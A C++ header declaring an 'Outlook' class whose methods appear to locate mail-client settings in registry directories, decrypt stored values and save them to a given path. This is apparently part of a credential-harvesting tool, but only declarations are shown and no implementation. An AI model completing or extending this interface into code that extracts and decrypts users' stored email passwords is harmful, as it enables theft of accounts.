#pragma once
#include <string>
#include <regex>


class Outlook {
public:
    static void GrabOutlook(const std::string& sSavePath);
    static std::vector<std::string> mailClients;
    static std::vector<std::string> regDirectories;
    static const std::regex MailClient;
    static const std::regex SmptClient;
    static std::string Get(const std::string& path, const std::vector<std::string>& clients);
    static std::string DecryptValue(unsigned char* value, int size);
};


